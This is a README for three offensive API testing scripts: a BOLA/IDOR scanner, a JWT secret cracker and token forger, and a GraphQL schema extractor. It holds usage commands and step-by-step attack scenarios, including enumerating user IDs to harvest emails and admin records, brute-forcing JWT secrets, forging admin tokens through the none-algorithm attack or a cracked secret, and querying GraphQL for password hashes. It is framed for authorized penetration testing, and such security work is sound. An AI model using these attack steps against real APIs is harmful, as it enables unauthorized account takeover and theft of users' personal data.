# API Security Testing Tools

Professional scripts for API vulnerability assessment and exploitation.

## 🛠️ Tools

### 1. BOLA Scanner (`bola_scanner.py`)

Test for Broken Object Level Authorization (BOLA/IDOR) vulnerabilities.

**Features:**
- Multi-threaded scanning
- Multiple endpoint support
- Sensitive data extraction
- JSON output

**Usage:**
```bash
# Basic scan
python3 bola_scanner.py -u "https://api.example.com/api/v1/users/{id}/profile" -t YOUR_TOKEN

# Custom range
python3 bola_scanner.py -u "https://api.example.com/api/v1/users/{id}" \
    -t TOKEN --start 1 --end 10000 --threads 20

# Multiple endpoints
python3 bola_scanner.py \
    -u "https://api.example.com/api/v1/users/{id}" \
    -u "https://api.example.com/api/v1/orders/{id}" \
    -t TOKEN --extract
```

**Output:**
- JSON file with all accessible endpoints
- Extracted emails, phones, admin users
- Sensitive field detection

---

### 2. JWT Cracker (`jwt_cracker.py`)

Brute force JWT secrets and forge tokens.

**Features:**
- Token information display
- None algorithm attack
- Quick test with common secrets
- Dictionary brute force
- Token forgery

**Usage:**
```bash
# Show token info
python3 jwt_cracker.py -t "eyJhbG..." --info

# Quick test
python3 jwt_cracker.py -t "eyJhbG..." --quick

# Brute force
python3 jwt_cracker.py -t "eyJhbG..." -w /usr/share/wordlists/rockyou.txt

# Forge token
python3 jwt_cracker.py -t "eyJhbG..." -s "found_secret" --forge \
    -p '{"role":"admin","user":"hacker"}' --extend-exp

# None algorithm attack
python3 jwt_cracker.py -t "eyJhbG..." --none
```

**Common Weak Secrets:**
- secret, secret123
- password, password123
- jwt, jwt_secret
- admin, root
- 123456, qwerty

---

### 3. GraphQL Scanner (`graphql_scanner.py`)

Comprehensive GraphQL API testing.

**Features:**
- Introspection testing
- Full schema extraction
- Sensitive field detection
- Batch query testing
- Query depth testing
- Field suggestions

**Usage:**
```bash
# Basic scan
python3 graphql_scanner.py -u https://api.example.com/graphql

# With authentication
python3 graphql_scanner.py -u https://api.example.com/graphql \
    -H "Authorization: Bearer TOKEN"

# Full scan
python3 graphql_scanner.py -u https://api.example.com/graphql --all

# Extract and analyze schema
python3 graphql_scanner.py -u https://api.example.com/graphql \
    --schema --analyze --save schema.json

# Specific tests
python3 graphql_scanner.py -u https://api.example.com/graphql \
    --introspection --batch --suggestions --depth
```

---

## 📋 Installation

### Requirements

```bash
pip install requests PyJWT
```

### Make Scripts Executable

```bash
chmod +x bola_scanner.py
chmod +x jwt_cracker.py
chmod +x graphql_scanner.py
```

---

## 🎯 Common Attack Scenarios

### Scenario 1: Finding BOLA/IDOR

```bash
# 1. Identify your own user ID
curl -H "Authorization: Bearer TOKEN" https://api.example.com/api/users/me
# Response: {"id": 1337, "email": "you@example.com"}

# 2. Test for IDOR
python3 bola_scanner.py -u "https://api.example.com/api/users/{id}" \
    -t TOKEN --start 1 --end 2000 --extract

# 3. Review results
cat bola_results.json | jq '.endpoints[] | select(.data.role == "admin")'
```

### Scenario 2: JWT Exploitation

```bash
# 1. Capture JWT token from request
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# 2. Analyze token
python3 jwt_cracker.py -t "$TOKEN" --info

# 3. Try quick attack
python3 jwt_cracker.py -t "$TOKEN" --quick

# 4. If secret found, forge admin token
python3 jwt_cracker.py -t "$TOKEN" -s "secret" --forge \
    -p '{"role":"admin"}' --extend-exp

# 5. Test new token
curl -H "Authorization: Bearer NEW_TOKEN" \
    https://api.example.com/api/admin/users
```

### Scenario 3: GraphQL Reconnaissance

```bash
# 1. Test for introspection
python3 graphql_scanner.py -u https://api.example.com/graphql --introspection

# 2. Extract full schema
python3 graphql_scanner.py -u https://api.example.com/graphql \
    --schema --save schema.json

# 3. Analyze for sensitive fields
python3 graphql_scanner.py -u https://api.example.com/graphql --analyze

# 4. Craft targeted query
curl https://api.example.com/graphql -d '{
  "query": "{ users { id email password_hash admin_notes } }"
}'
```

---

## ⚠️ Legal Disclaimer

**WARNING:** These tools are for authorized security testing only!

- ✅ **Legal Use:**
  - Your own applications
  - Authorized penetration tests
  - Bug bounty programs (within scope)
  - Educational labs

- ❌ **Illegal Use:**
  - Unauthorized access to systems
  - Testing without permission
  - Malicious intent

Always obtain written authorization before testing any system you don't own.

---

## 🔗 Integration with Penetration Test Suite

Use these scripts with the main tool:

```bash
# Run via main tool
python3 penetration-test.py scan api.example.com \
    --plugin api_scanner \
    --config api_config.json

# Or run scripts directly
cd scripts/api-tools/
python3 bola_scanner.py -u "https://api.example.com/users/{id}" -t TOKEN
```

---

## 📚 Resources

### Learning
- [OWASP API Security Top 10](https://owasp.org/API-Security/)
- [PortSwigger API Testing](https://portswigger.net/web-security/api-testing)
- [HackTricks API Pentesting](https://book.hacktricks.xyz/pentesting-web/web-api-pentesting)

### Practice Labs
- [OWASP crAPI](https://github.com/OWASP/crAPI) - Vulnerable API for practice
- [Damn Vulnerable GraphQL](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application)
- [VAmPI](https://github.com/erev0s/VAmPI) - Vulnerable API

### Tools
- [Postman](https://www.postman.com/)
- [Burp Suite](https://portswigger.net/burp)
- [jwt_tool](https://github.com/ticarpi/jwt_tool)
- [Arjun](https://github.com/s0md3v/Arjun)

---

## 🤝 Contributing

Found a bug? Have an improvement? Contributions welcome!

1. Fork the repository
2. Create feature branch
3. Add tests
4. Submit pull request

---

## 📝 License

MIT License - See main repository for details.
